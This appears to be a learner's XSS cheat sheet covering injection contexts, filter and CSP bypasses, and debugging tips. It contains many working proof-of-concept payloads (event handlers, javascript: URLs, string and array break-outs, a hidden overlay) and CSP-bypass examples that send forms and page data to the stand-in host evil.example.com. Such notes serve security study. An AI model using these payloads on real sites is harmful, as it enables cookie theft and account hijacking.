### Table of Contents
1. Execution
2. Bypass Filter/Sanitization
3. Exploit Development
4. Headers
5. Tags
6. Tips

**Cheat Sheet**
[Portswigger Cheat Sheet]: https://portswigger.net/web-security/cross-site-scripting/cheat-sheet
[Above Downloaded File]: /sec/web/xss/xss-cheat-sheet.pdf

**Other Resources**
[AppSecEU Slides & Videos]: https://2017.appsec.eu/slides-and-videos
[Course]: https://chefsecure.com/courses/xss

**Strategy**
1. Look At the Context I'm Injecting In
2. See if it's impossible (such as angle brackets in html tag is sanitized)
3. Make a customized payload for that context

**Alert Examples**
1. `alert(document.domain);`
2. `alert(1);` - try to stay away from this
5. `delete alert;alert(1)`
4. `FF: Components.lookupMethod(window, 'alert') (1)`
5. `alert(document.cookie)`

**JS Beautify**
beautifier.io 
jsnice.org

------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------


# 1. Execution
 + Note that things in `()` runs first like in math
 + Brower doesn't care about dangling _closing tags_ like `</textarea>`
  - or a lack of one `<iframe><iframe></iframe>`
 
 1. HTML Attributes
 2. URLs
 3. Event Handling
 4. Inside JS
 5. Exploit Development
 6. XS-Search


       ============================================================


  **1. HTML Attributes**
+ Uses: Html Attributs, Html Tags, & JS Functions
``` 
Template:               | Example:
                        |
     +---- attributes   |                         tag      value
     |                  |                          |         |
     V                  |                          V         v
 tag = "value"          | <h1 class "hover-title" title="something">Hover</h1>
```

+ Break out With
 1. `'` - singe qutoes:  `'(payload)`
 2. `'` - double qutoes: `"(payload)`
 3. Space Characters: `(space, \f, \n, \r, \t)`

+ Examples
 - Basic: `"><script>alert(document.domain)</script>`
 - Basic: `"</textarea><script>alert(document.domain)</script>`


       ============================================================


  **2. URLs**
* Uses: Html Attributes, Html Tags, JS Functions, URL Schemes
* Note that `javascript:alert()` or `"javascript:alert()"` should work regardless of quotes

+ Potential Tag Targets 
 - Link:   <a href="{{input_from_url}}">Link</a>
 - iFrame: <iframe src="{{input_from_url}}"></frame>
 
+ Examples:
 - Basic: `javascript:alert(document.domain)`

+ Sample Results that pull from URL:

 - location = 'javascript:alert()'
 - <iframe src=javascript:alert()></iframe>
 - <a href=javascript:alert()>Link></a>
 
+ `<h1>` Elements is _NOT going to work_ cause it _doesn't host content_ from another webpage


       ============================================================


  **3. Event Handling**
* Uses: CSS, Events, Event Handling, Html Attributes, JS Fucntions, URL Encoding
* See cheat sheet _xss-cheat-sheet.pdf_ for more

+ Sample Events
 - _Onoload_: executes given javascript function when tag loads
  * Body Tag Example: `<body onload=alert(‘Welcome to Hacking Articles’)>`
 - _onerror_
  * `<img src=invalid onerror=alert()>`
 - _Onmouseover_: when a user moves his cursor over a specific text
  * `<a onmouseover=alert(“50% discount”)>surprise</a>`
 - _Etc._
 

+ Examples
 - `'onload=alert'()`  --->  `class ='title 'onload'='alert()'`


+ Use **CSS Styling** to change _how things appear_ on the website
 - Can use `style`                                                           v--- url encoding
 - Example: `'onmouseover=alert() style=position:fixed;top:0;left:0;width:100%25;color:transparent;`
                                                                             ^--- % is \x25
 - Self-Delete `style`: `"onmouseover=this.removeAttribute('onmouseover');this.removeAttribute('Style');`
  * can put this  in between `onmouseover=` and `alert();`
  
 - Full: `'onmouseover=this.removeAttribute('onmouseover');this.removeAttribute('Style');alert() style=position:fixed;top:0;left:0;width:100%25;color:transparent;`


       ============================================================


  **4. Inside JS**
* Uses: JS Arrays/comments/functions/numbers/strings/objects/operators/template literals
* Browser will _parse Html BEFORE running JS_
* This **assumes you're input/source is INSIDE** `<script>` & `</script>`

       - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

    1. **Break Out of String Context** within `<script>` & `</script>`
      + To _prevent errors_, surround payload with _proper quotes_ and `+`s or `-`s
       - In the templates below the `'`, `"`, `backticks` are used to _exit the string context_
       - Then the `+` or `-` help prevent the JS for failing
     ```Templates
     <script>
         ''+payload+''   ''-payload-''
         ""+payload+""   ""-payload-""
         ``+payload+``   ``-payload-``
     </script>
     ```
     ```Examples
     <script>
       ''+alert()+'' 
        var input = ''+alert()+''
     </script>
     ```
    
      + When using the **backtick**, while it can be used in a string, it can also _hold code_:
    ```BACKTICKS_Inject_Code
      `${code}`
      `${alert()}`
      ^----------- Only works on backticks (not "" or '')
    ```

      + Use a _closing with an opening_ tag `</script><script>`
      ```Example
     <script>
      let s = '</script><script>alert()//'
     </script>
      ```

       - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -


    2. **Break Out of Array Context** within `<script>` & `</script>`
     ```',alert,'
     [1,'',alert(),'']
    ```
    ```',x:alert(),'
    {number:1,name'',x:alert(),y:''}
     ```

       ============================================================


  **6. XS-Search**
[LiveOverflow]: https://www.youtube.com/watch?v=HcrQy0C-hEA

       ============================================================


------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------



# 2. Bypass Filter/Sanitization

[OWASP Cheat Sheet]: https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html

- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - -

**Things to Try**

+ If the _"__ doesn't break out of class attribute context
 - Just throw in a _'_ or _`_ to see if it works


       ============================================================


**Polyglot**
+ Single payload to test multiple things
+ Payload of All Things Has Some Examples
  ```Things_Tested
     Events         | Event Handlers |            |              |
     HTLM Elements  |                |            |              |
     JS Comments    | JS Functions   | JS Strings | JS Operators | JS Regex
     URL Encoding   | URL Schemes    |            |              |
  ```

+ Can use comments `//` or `/**/` to comment out stuff

+ js allows algebra non nan (not a number) using `*-` without throwing an error

+ parentheses `()` follow before JS like `onload=alert()`


**Bypass Filters**

+ Can use `/` after tag name instead of a space
  `<iframe/oNloAd=alert()//>`

+ Use _URL Encoding_
 - The Browser will automatically _decode URL encoded values_
 - Encoded URL parameters get decoded when variables from URL 

       ============================================================


**XSS payload without = `javascript:`, `on*=`,`alert()`**

+ Space Characters: `(space, \f, \n, \r, \t)`
+ Capitalization: `jAvaScriPt`
+ Look at the payload of all things for more


       ============================================================


**XSS payload without - &<>"=()**
[Link]: https://security.stackexchange.com/questions/173032/xss-payload-without

**Script Gadgets**
[Script Gadgets]: /sec/web/xss/Bypassing XSS mitigations via Script gadgets.pdf
[Video]: https://www.youtube.com/watch?v=p07acPBi-qw&list=PLpr-xdpM8wG8RHOguwOZhUHkKiDeWpvFp&index=4

+ DOM XSS notes has more detail on this


       ============================================================
       
       
**Bypass CSP**
* Uses: CSP, CSS, Html Comments, Html Elements, JS Fucntions, URLs

+ _Whitelisting generic CDN domains_ - `generic.cdn.example.com`
 - Attacker can upload own scripts

+ Check if the _nonce_ value is properly set:
  ```Example
  <meta http-equiv="Content-Security-Policy" content="
      default-src 'self'; script-src 'self' 'nonce-rAnd0m';
  ">
  
  <script nonce="rAnd0m">
  	doWhatever();
  </script>
  ```

+ `base-uri` is not set:
     <base href="https://evil.example.com">
 - Once hijacked, relative URLs are vulnerable
 - I just make my evil.example.com have the same `href`/`forms`

+ `form-action` - specifies where forms can submit their data
   If it's not set:
     <form action=https://evil.example.com>
       <!--inputs-->
     </forms>

+ `script-src` that allow XSS:
 - `script-src 'unsafe-inline'`
 - `script-src http`
 - `script-src https`
 - `script-src *`

+ `img-src` - FIREFOX SPECIFIC
 - Stealing With Images
 - Only _works if image is above the html content_
 - Can transport sensitive info like cookies over using JS
   `<img src='https://evil.example.com?`
 - If you look at the _nework tab_ in the _developer tools_ the html from the webpage can be send


       
       ============================================================


**JS Fuck**
[Link]: http://www.jsfuck.com/
+ Javascript only using: `[]()!` -  may be some other


       ============================================================


**JSONP**
* CORS Attack
[There's a chapter on JSONP - LiverOverflow]: https://www.youtube.com/watch?v=aCexqB9qi70


       ============================================================

**Regex**
+ Break out of _regex context_ with the `/`
+ `*-` after the forward slash is ok and won't throw an error so long as 
+ Parantheses `()` 

**Regex Bypass - Safari**
1. Use regex format in _Safari_
[LiveOverflow]: https://www.youtube.com/watch?v=eQFbG6CwwdI
```Regex_Format
<base href="javascript:/a/-alert(1)/">
                            ^this gets executed
<a href="test.html">click</a>
```

 +  Adding `//////` to bypass potential combining of `base` and `href`
```//////
                                    v----these will combine with `../` below
<base href="javascript:/a/-alert(1)/////////">                    |
                                                                  |
<a href="../../../lol/test.html">click</a>                        |
         ^--------------------------------------------------------+
```


       ============================================================


------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------

# 3. Exploit Development
* Uses: CSS Selectors, Events, Event Handlers, JS Ajax Requests, JS Functions,
        JS HTML Collections, JS strings, JS objects, JS variables, JSON encoding,
        URLs
 [Chef Secure]:  https://chefsecure.com/courses/xss/recipes/how-to-create-real-xss-exploits-to-attack-websites
        
  **Steal Cookie** 
    * `alert(document.cookie)`

------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------
  

# 4. Headers

   ============================================================


**CSP - Content Security Policy**
[Link]: https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP
+ Reduce or eliminate the vectors for XSS by _specifying the domains_ that the browser should 
  consider to be _valid sources of executable scripts_
 - Only executes scripts loaded in source files for allowed domains
  
+ `X-Content-Security-Policy` & `X-WebKit-CSP` is an older version
+ `Content-Security-Policy: <directive> <value>;<directive> <value>`

+ HTML
`<meta http-equiv="Content-Security-Policy" content="<directive> <value>; <directive> <value>"`
+ Restrict Where Scripts are Run
`Content-Security-Policy: script-src https://somedomain:8080`


   ============================================================


**HSTS - Html Strick Transport Security**
+ Ensures browser is using `HTTPS` so communication is encrypted


   ============================================================


------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------


# 5. Tags

**Anchor Tag**
`<a href="javascript:alert(1)">click</a>`


**Base Tag**
+ `href` is done by _combinbing_ the `base` tag with the `href`


------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------


### 6. Tips

**Cause a JS Error to see how browser sees it**

1. Write something that will cause an error
```JS_Error
                                     v------look at x.x
<base href="javascript:/**/-alert(1);x.x">
<a href="test.html">click</a>
```
2. Look at the _Console_ in _Developer Tools_
  + Find the error `Can't find variable:x`
3. Click on `Script Element` to see the script with the error
  + You should now see how the browser sees your input 


------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------
------------------------------------------------------------------------------------------


